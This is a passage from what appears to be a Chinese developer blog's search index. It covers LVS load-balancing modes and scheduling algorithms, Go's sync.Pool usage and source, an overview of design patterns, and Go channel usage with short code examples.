Support&#x2F;typora-user-images&#x2F;image-20230306142102784.png)</p><ul><li>优点：与隧道模式一样，负载均衡器也只是分发请求，应答包通过单独的路由方法返回给客户端。同时，不需要隧道结构，可以使用大多数服务器作为 RS</li><li>缺点：要求 VIP 必须与物理网卡在一个物理段上，否则 ARP 不能寻到不同网段的 MAC 地址。也就是说所有 RS 节点和调度器 LB 只能在一个局域网里面</li></ul><h5 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h5><p>NAT (Network Address Translation) 即网络地址转换，包括 SNAT (源地址转换) 与 DNAT (目标地址转换). 它通过修改请求报文的目标 IP 地址 (同时可能会修改目标端口) 挑选出某台 Real Server 的 RIP 地址实现转发。在请求与响应过程中期间，无论是进来的流量，还是出去的流量，都必须经过 LVS 负载均衡器.</p><ol><li>客户端将请求发往负载均衡器，请求报文源地址是 CIP, 目标地址为 VIP</li><li>负载均衡器通过地址转换，将客户端发来的数据包转发至后端 RIP</li><li>RS 处理完成后响应对负载均衡器返回响应数据</li><li>负载均衡器通过地址转换，将 RS 的响应数据响应给客户端</li></ol><p>![image-20230306141507935](&#x2F;Users&#x2F;suhang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230306141507935.png)</p><blockquote><p>注意: RIP 与 DIP 需要在同一网络，且 RIP 网关必须指向 DIP</p></blockquote><ul><li>优点：只需要暴露出一个 VIP 地址即可，对用户来说后端服务器是完全透明的</li><li>缺点：当 RS 节点增长过多时，负载均衡器将成为性能瓶颈，速度会变慢</li></ul><h5 id="TUN模式"><a href="#TUN模式" class="headerlink" title="TUN模式"></a>TUN模式</h5><p>负载均衡器把客户端发来的数据包，封装一个新的 IP 头标记 (仅目的 IP) 发给 RS.RS 收到后，先把数据包的头解开，还原数据包，处理后，直接返回给客户端，不需要再经过负载均衡器</p><ol><li>客户端将请求发往负载均衡器，请求报文源地址是 CIP, 目标地址为 VIP</li><li>负载均衡器将在客户端请求报文的首部再封装一层 IP 报文，将源地址改为 DIP, 目标地址改为 RIP, 并通过 IP 隧道技术将报文发给 RS</li><li>RS 收到后，先把数据包头解开，还原数据包，处理后，直接返回给客户端，不需要再经过负载均衡器</li></ol><p>![image-20230306141734441](&#x2F;Users&#x2F;suhang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230306141734441.png)</p><ul><li>优点：减少负载均衡器压力，负载均衡器不再是系统的瓶颈，能够处理更多的请求流量</li><li>缺点: RS 节点需要合法 IP, 且需要所有服务器支持 <code>IP Tunneling</code>(IP Encapsulation) 协议，因此服务器可能只局限于部分 Linux 系统上</li></ul><h5 id="FULLNAT模式"><a href="#FULLNAT模式" class="headerlink" title="FULLNAT模式"></a>FULLNAT模式</h5><h5 id="四种模式比较"><a href="#四种模式比较" class="headerlink" title="四种模式比较"></a>四种模式比较</h5><h4 id="LVS负载均衡常见算法"><a href="#LVS负载均衡常见算法" class="headerlink" title="LVS负载均衡常见算法"></a>LVS负载均衡常见算法</h4><ul><li>轮训调度<ul><li>按依次循环的方式将请求调度到不同的服务器上，该算法大的特点就是实现简单。轮询算法假设所有的服务器处理请求的能力都一样的，调度器会将所有的请求平均分配给每个真实服务器。</li></ul></li><li>加权轮训调度<ul><li>Weight Round Robin 简称WRR，轮询算法的一种优化与补充，LVS会考虑每台服务器的性能，并给每台服务器添加一个权值，如果服务器A的权值为1，服务器B的权值为2，则调度器调度到服务器B的请求会是服务器A的两倍。权值越高的服务器，处理的请求越多。</li></ul></li><li>最小连接调度<ul><li>Least Connections 简称LC，算法是把新的连接请求分配到当前连接数小的服务器。小连接调度是一种动态的调度算法，它通过服务器当前活跃的连接数来估计服务器的情况。调度器需要记录各个服务器已建立连接的数目，当一个请求被调度到某台服务器，其连接数加1;当连接中断或者超时，其连接数减1。</li></ul></li><li>加权小连接调度<ul><li>Weight Least Connections 简称WLC，是小连接调度的超集，各个服务器相应的权值表示其处理性能。</li><li>调度器可以自动问询真实服务器的负载情况，并动态调整权值，带权重的谁不干活就给谁分配，机器配置好的权重高。</li></ul></li><li>基于局部的小连接<ul><li>Locality-Based Least Connections 简称LBLC，算法是针对请求报文的目标IP地址的 负载均衡调度，目前主要用于Cache集群系统，因为在Cache集群客户请求报文的目标IP地址是变化的。这里假设任何后端服务器都可以处理任一请求，算法的设计目标是在服务器的负载基本平衡情况下，将相同目标IP地址的请求调度到同一台服务器，来提高各台服务器的访问局部性和Cache命中率，从而提升整个集群系统的处理能力。</li></ul></li><li>带复制的基于局部性的少连接<ul><li>Locality-Based Least Connections with Replication 简称LBLCR，算法也是针对目标IP地址的负载均衡，目前主要用于Cache集群系统，它与LBLC算法不同之处是它要维护从一个目标IP地址到一组服务器的映射，而LBLC算法维护从一个目标IP地址到一台服务器的映射。</li></ul></li><li>目标地址散列调度<ul><li>Destination Hashing 简称DH，算法先根据请求的目标IP地址，作为散列键(Hash Key)从静态分配的散列表找出对应的服务器，若该服务器是可用的且并未超载，将请求发送到该服务器，否则返回空。</li></ul></li><li>源地址散列调度<ul><li>Source Hashing 简称SH，算法先根据请求的源IP地址，作为散列键(Hash Key)从静态分配的散列表找出对应的服务器，若该服务器是可用的且并未超载，将请求发送到该服务器，否则返回空。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-sync.Pool使用及原理</title>
      <link href="/Code/Code-Golang-Pool/"/>
      <url>/Code/Code-Golang-Pool/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h2><p>​你想看一本书，需要的时候开始印刷，看完了就卖废品，1000个人想看就得印刷1000本书，卖1000本废品。这明显太不绿色了，你想了想如果建一个图书馆，里面放几本书，大家想看的时候去借，看完了再还回去，这明显高效了不少。</p><p>​程序员发现了你用图书馆的方式合理的利用了资源，于是照猫画虎发明了连接池、线程池、协程池、内存池，各种各样的池都是想解决同类的问题：创建连接、线程等都相对比较消耗资源，通过池存一写已经新建的连接，线程…需要的时候拿去用，不用了就再还回来。借与还的模式，节省了不少资源，大家都说好。</p><p>​Golang的sync.Pool，对象池。采用对象池来创建对象，增加对象的重复利用率，使用的时候就不必在堆上重新创建对象可以节省开销。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>sync.Pool对外提供三个方法：New，Get，Put。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> pool <span class="token operator">*</span>sync<span class="token punctuation">.</span>Pool<span class="token keyword">type</span> Book <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    Name <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    pool <span class="token operator">=</span> <span class="token operator">&amp;</span>sync<span class="token punctuation">.</span>Pool<span class="token punctuation">&#123;</span>        New<span class="token punctuation">:</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">new</span><span class="token punctuation">(</span>Book<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    book <span class="token operator">:=</span> pool<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>Book<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span> <span class="token comment">// &amp;&#123;&#125;</span>    book<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"Go Programming"</span>    pool<span class="token punctuation">.</span><span class="token function">Put</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>Book<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// &amp;&#123;Go Programming&#125;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>Book<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// &amp;&#123;&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul><li>结构体</li></ul><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Pool <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    noCopy noCopy <span class="token comment">// 禁止拷贝</span>    local     unsafe<span class="token punctuation">.</span>Pointer <span class="token comment">// [P]poolLocal poolLocal数组指针</span>    localSize <span class="token builtin">uintptr</span>        <span class="token comment">// 数组大小</span>    victim     unsafe<span class="token punctuation">.</span>Pointer <span class="token comment">// GC处理并不直接将allPools的object直接进行GC处理，而是保存到oldPools，等到下一个GC周期到了再处理。</span>    victimSize <span class="token builtin">uintptr</span>    <span class="token comment">// 当pool没有缓存对象的时候，会调用New方法生成一个新的对象</span>    New <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> poolLocal <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    poolLocalInternal    pad <span class="token punctuation">[</span><span class="token number">128</span> <span class="token operator">-</span> unsafe<span class="token punctuation">.</span><span class="token function">Sizeof</span><span class="token punctuation">(</span>poolLocalInternal<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> poolLocalInternal <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    private <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>   <span class="token comment">// Can be used only by the respective P.</span>    shared  poolChain   <span class="token comment">// Local P can pushHead/popHead; any P can popTail.</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> poolChain <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// head is the poolDequeue to push to. This is only accessed</span>    <span class="token comment">// by the producer, so doesn't need to be synchronized.</span>    head <span class="token operator">*</span>poolChainElt    <span class="token comment">// tail is the poolDequeue to popTail from. This is accessed</span>    <span class="token comment">// by consumers, so reads and writes must be atomic.</span>    tail <span class="token operator">*</span>poolChainElt<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Get</li></ul><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>p <span class="token operator">*</span>Pool<span class="token punctuation">)</span> <span class="token function">Get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span> <span class="token comment">// 不允许竞态检测</span>        race<span class="token punctuation">.</span><span class="token function">Disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    l<span class="token punctuation">,</span> pid <span class="token operator">:=</span> p<span class="token punctuation">.</span><span class="token function">pin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 获取一个poolLocal</span>    x <span class="token operator">:=</span> l<span class="token punctuation">.</span>private    l<span class="token punctuation">.</span>private <span class="token operator">=</span> <span class="token boolean">nil</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Try to pop the head of the local shard. We prefer</span>        <span class="token comment">// the head over the tail for temporal locality of</span>        <span class="token comment">// reuse.</span>        x<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> l<span class="token punctuation">.</span>shared<span class="token punctuation">.</span><span class="token function">popHead</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>            x <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getSlow</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">runtime_procUnpin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>        race<span class="token punctuation">.</span><span class="token function">Enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> x <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>            race<span class="token punctuation">.</span><span class="token function">Acquire</span><span class="token punctuation">(</span><span class="token function">poolRaceAddr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> p<span class="token punctuation">.</span>New <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 没拿到 new一个</span>        x <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> x<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p <span class="token operator">*</span>Pool<span class="token punctuation">)</span> <span class="token function">pin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span>poolLocal <span class="token punctuation">&#123;</span>    pid <span class="token operator">:=</span> <span class="token function">runtime_procPin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    s <span class="token operator">:=</span> atomic<span class="token punctuation">.</span><span class="token function">LoadUintptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">.</span>localSize<span class="token punctuation">)</span> <span class="token comment">// load-acquire</span>    l <span class="token operator">:=</span> p<span class="token punctuation">.</span>local                          <span class="token comment">// load-consume</span>    <span class="token keyword">if</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span> <span class="token operator">&lt;</span> s <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">indexLocal</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> pid<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> p<span class="token punctuation">.</span><span class="token function">pinSlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-23-%E6%9D%82-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-23-%E6%9D%82-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是设计模式"><a href="#什么是设计模式" class="headerlink" title="什么是设计模式"></a>什么是设计模式</h3><p>设计模式是为了重用代码、让人更容易理解代码、保证代码可靠性而总结出来的通用的解决方案。你从来没有学过设计模式，但是遇到类似的问题一定有自己的解决方案，那这个解决方案也算自己的设计模式吧。或者在看到某种设计模式的时候会突然发现，原来自己早就用了传说中的种种设计模式了。一直在使用，只是不知道它还有个名字。</p><h3 id="设计模式分类"><a href="#设计模式分类" class="headerlink" title="设计模式分类"></a>设计模式分类</h3><h4 id="根据目的"><a href="#根据目的" class="headerlink" title="根据目的"></a>根据目的</h4><ul><li>创建型：主要用于创建对象</li><li>结构型：主要用于处理类或对象的组合</li><li>行为型：主要用于描述对象或对象怎样交互和分配职责</li></ul><h4 id="根据范围"><a href="#根据范围" class="headerlink" title="根据范围"></a>根据范围</h4><ul><li>类模型：处理类和子类之间都得关系，这些关系是过继承简历，在编译时刻就被确定下来，属于静态的。</li><li>对象模型：处理对象间的关系，这些关系在运行时刻变化，更具动态性。</li></ul><p><img src="https://i.loli.net/2021/07/23/3ETtLMsqu4oeWJm.png" alt="640.png"></p><h4 id="创建型"><a href="#创建型" class="headerlink" title="创建型"></a>创建型</h4><ol><li><p>简单(静态)工厂：工厂类通过传入的参数决定创建哪种产品类型</p><p>定义一个工厂类来负责创建其他类的实例，被创建的实例通常都具有共同的父类，在工厂类中，可以根据参数的不同返回不同类的实例。升级版本简单工厂模式，通过反射根据类的全路径名生成对象。</p><ul><li>代码可读性更好</li><li>与使用者代码解耦</li></ul></li><li><p>抽象工厂：创建相关或依赖对象的家族，而无需明确指定具体类</p></li><li><p>建造者模式：封装一个复杂对象的构建过程，并可以按步骤构造</p><ul><li>封装复杂对象的创建过程，使对象使用者不感知复杂的创建逻辑</li><li>可以一步步按照顺序对成员进行赋值，或者创建嵌套对象，并最终完成目标对象的创建</li><li>对多个对象复用同样的对象创建逻辑</li></ul></li><li><p>单例模式：某个类只能有一个实例，提供一个全局的访问点</p><p>有一些对象通常我们只需要一个共享的实例，比如线程池、全局缓存、对象池等，这种场景下就适合使用单例模式。</p><ul><li>限制调用者直接实例化该对象</li><li>为该对象的单例提供一个全局唯一的访问方法</li></ul><p>单例模式有在初始化时机上可以分：</p><ul><li>饿汉模式：加载是就初始化，即使后续不用也会消耗一定的资源</li><li>懒汉模式：外部使用的时候才初始化，但初始化时要注意线程安全。golang once天生能处理这种情况。</li></ul></li><li><p>原型模式：通过复制现有的实例来创建新的实例</p><p>原型模式主要解决对象复制的问题，它的核心就是<code>clone()</code>方法，返回<code>Prototype</code>对象的复制品。</p></li></ol><h4 id="结构型"><a href="#结构型" class="headerlink" title="结构型"></a>结构型</h4><ol><li><p>外观模式：对外提供一个统一的方法，来访问子系统中的一群接口</p><p>外观模式经常运用于<strong>分层架构</strong>上，通常我们都会为分层架构中的每一个层级提供一个或多个统一对外的访问接口，这样就能让各个层级之间的耦合性更低，使得系统的架构更加合理。</p></li><li><p>桥接模式：将抽象部分和它的实现部分分离，使它们都可以独立的变化</p><p>桥接模式本质上就是面向接口编程，可以给系统带来很好的灵活性和可扩展性。</p></li><li><p>组合模式：将对象组合成树形结构以表示“”部分-整体“”的层次结构</p><p>将对象组合成树形结构以表示“部分-整体”的层次结构，使得用户对单个对象和组合对象的使用具有一致性，组合优于继承。</p></li><li><p>装饰模式：动态的给对象添加新的功能</p><p>使用组合而非继承的方式，能够动态地为本体对象叠加新的行为.从结构上看，装饰模式和代理模式具有很高的相似性，但是两种所强调的点不一样。前者强调的是为本体对象添加新的功能，后者强调的是对本体对象的访问控制。</p></li><li><p>代理模式：为其他对象提供一个代理以便控制这个对象的访问</p><p>使用代理模式的关键在于当Client不方便直接访问一个对象时，提供一个代理对象控制该对象的访问。Client实际上访问的是代理对象，代理对象会将Client的请求转给本体对象去处理。</p><ul><li>远程代理</li><li>虚拟代理</li><li>保护代理</li><li>缓存代理</li><li>智能引用</li></ul></li><li><p>适配器模式：将一个类的方法接口转换成客户希望的另外一个接口</p><p>让原本因为接口不匹配而无法一起工作的两个对象能够一起工作。将一个接口<code>Adaptee</code>，通过适配器<code>Adapter</code>转换成<code>Client</code>所期望的另一个接口<code>Target</code>来使用，实现原理也很简单，就是<code>Adapter</code>通过实现<code>Target</code>接口，并在对应的方法中调用<code>Adaptee</code>的接口实现。</p></li><li><p>亨元（蝇量）模式：通过共享技术来有效的支持大量细粒度的对象</p><p>享元模式摒弃了在每个对象中保存所有数据的方式， 通过共享多个对象所共有的相同状态， 让你能在有限的内存容量中载入更多对象。</p></li></ol><h4 id="行为型"><a href="#行为型" class="headerlink" title="行为型"></a>行为型</h4><ol><li>模板模式：定义一个算法结构，而将一些步骤延迟到子类实现</li><li>解释器模式：给定一个语言，定义它的文法的一种表示，并定义一个解释器</li><li>策略模式：定义一系列算法，把他们封装起来，并且使它们可以相互替换</li><li>状态模式：允许一个对象在其对象内部状态改变时改变它的行为</li><li>观察者模式：对象间的一对多的依赖关系</li><li>备忘录模式：在不破坏封装的前提下，保持对象的内部状态</li><li>中介者模式：用一个中介对象来封装一系列的对象交互</li><li>命令模式：将命令请求封装为一个对象，使得可以用不同的请求来进行参数化</li><li>访问者模式：在不改变数据结构的前提下，增加作用于一组对象元素的新功能</li><li>责任链模式：将请求的发送者和接收者解耦，使的多个对象都有处理这个请求的机会</li><li>迭代器模式：一种遍历访问聚合对象中各个元素的方法，不暴露该对象的内部结构</li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p><a href="https://github.com/blinkbean/goSteps">https://github.com/blinkbean/goSteps</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Channel能怎么用?</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-22-Golang-Channel%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-22-Golang-Channel%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="Golang-CSP"><a href="#Golang-CSP" class="headerlink" title="Golang CSP"></a>Golang CSP</h3><blockquote><p>不要通过共享内存来通信，而应该通过通信来共享内存。</p></blockquote><p>CSP模型用于描述两个独立的并发实体通过共享的通信管道（channel）进行通信的并发模型。Golang借用process和channel两个概念作为并发的理论支持。process在golang表现就是goroutine是实际并发执行的实体，每个实体之间通过channel通信实现数据共享。</p><h3 id="channel初始化"><a href="#channel初始化" class="headerlink" title="channel初始化"></a>channel初始化</h3><p>使用channel必须make初始化。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">unBufferChan <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> Type<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// Type: int、string...</span>bufferChan <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> Type<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token comment">// 有缓存的通道</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果使用未初始化的channel会有dead lock错误：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> x <span class="token keyword">chan</span> <span class="token builtin">int</span>    <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        x <span class="token operator">&lt;-</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token operator">&lt;-</span>x<span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>fatal <span class="token builtin">error</span><span class="token punctuation">:</span> all goroutines are asleep <span class="token operator">-</span> deadlock<span class="token operator">!</span>goroutine <span class="token number">1</span> <span class="token punctuation">[</span><span class="token keyword">chan</span> receive <span class="token punctuation">(</span><span class="token boolean">nil</span> <span class="token keyword">chan</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>main<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="单向channel"><a href="#单向channel" class="headerlink" title="单向channel"></a>单向channel</h3><p>单向channel主要用在函数声明中。是约定，但是强制必须这样。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 输入一个只能写的channel，返回一个只能读的channel</span><span class="token keyword">func</span> <span class="token function">foo</span><span class="token punctuation">(</span>ch <span class="token keyword">chan</span><span class="token operator">&lt;-</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token builtin">int</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token comment">// context包的Done()方法。</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Context<span class="token punctuation">)</span> <span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="channel读写"><a href="#channel读写" class="headerlink" title="channel读写"></a>channel读写</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">// 读操作</span>x <span class="token operator">&lt;-</span> ch<span class="token comment">// 写操作</span>ch <span class="token operator">&lt;-</span> x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>读<ol><li>从空的缓冲channel里读消息，会block。</li><li>从无缓冲channel读消息，如果没有另一个goroutine正在写，会block。</li><li>从已关闭的channel读消息，&#x3D;&#x3D;v,ok :&#x3D; &lt;-c&#x3D;&#x3D;，v为通道类型的默认值，ok为false。</li></ol></li><li>写<ol><li>向无缓冲channel写消息，如果没有另一个goroutine正在读，会block。</li><li>向已关闭的channel写消息，会panic。&#x3D;&#x3D;panic: send on closed channel&#x3D;&#x3D;。</li></ol></li></ul><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>select内channel有点特殊，不会block，与golang编译有关。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">select</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> e<span class="token punctuation">,</span> ok <span class="token operator">:=</span> <span class="token operator">&lt;-</span>ch1<span class="token punctuation">:</span>        <span class="token operator">...</span>    <span class="token keyword">case</span> e<span class="token punctuation">,</span> ok <span class="token operator">:=</span> <span class="token operator">&lt;-</span>ch2<span class="token punctuation">:</span>        <span class="token operator">...</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>  <span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">select</span> <span class="token punctuation">&#123;</span>        <span class="token operator">...</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 超时控制</span><span class="token keyword">select</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> <span class="token operator">&lt;-</span> ch<span class="token punctuation">:</span>    <span class="token comment">// get data from ch</span>  <span class="token keyword">case</span> <span class="token operator">&lt;-</span> time<span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>    <span class="token comment">// read data from ch timeout</span><span class="token 